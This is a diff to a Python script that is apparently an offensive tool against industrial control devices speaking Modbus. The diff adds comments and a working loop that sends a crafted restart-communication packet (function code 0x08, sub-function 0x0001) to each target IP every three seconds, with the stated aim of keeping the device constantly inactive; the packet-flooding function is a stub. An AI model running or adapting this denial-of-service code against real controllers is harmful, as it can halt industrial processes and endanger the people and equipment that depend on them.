@@ -344,6 +344,10 @@ def altered_control_set_points(ip_addresses):
 
     print("### ALTERED CONTROL SET POINTS FINSIH")
 
+# Function: force_listen_mode
+# Purpose: Sends function code 0x08 with sub-function code 0x0004
+#   to force a device into Force Listen Mode. Devices that accept this
+#   function code will stop responding to Modbus requests.
 def force_listen_mode(ip_addresses):
     print("### FORCE LISTEN MODE ###")
 
@@ -363,14 +367,45 @@ def force_listen_mode(ip_addresses):
 
     print("### FORCE LISTEN MODE FINISH ###")
 
-
+# Function: restart_communication
+# Purpose: Sends function code 0x08 with sub-function code 0x0001
+#   to restart the device. Does this to cause the device to be constantly
+#   inactive.
 def restart_communication(ip_addresses):
+    global stop_looping
     print("### RESTART COMMUNICATION ###")
 
+    for ip in ip_addresses:
+        stop_looping = False
+        th_stopper = Thread(target=_check_for_enter)
+        th_stopper.start()
+
+        print(f"Sending a restart communication request to {ip} in 3 second intervales")
+        print("Press enter to stop")
+
+        while not stop_looping:
+            client = ModbusClient(host=ip, port=502)
+
+            # send custom pdu request for a Restart Communcation - function code 08 with subfunction code 01 (device - dependent)
+            pdu = b'\x08\x00\x01\x00\x00'
+            response = client.custom_request(pdu)
+
+            # check if exception occurred
+            if response == None:
+                print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
+            else:
+                print(f"Successful attack! Sent Restart Communication packet")
+            sleep(3)
+            
     print("### RESTART COMMUNICATION FINISH ###")
 
+# Function: packet_flooding_attack
+# Purpose: Floods packets of random content to the devices
 def packet_flooding_attack(ip_addresses):
     print("### PACKET FLOODING ATTACK ###")
+
+    for ip in ip_addresses:
+        print(f"Flooding {ip} with random packets")
 
     print("### PACKET FLOODING ATTACK FINISH ###")
 
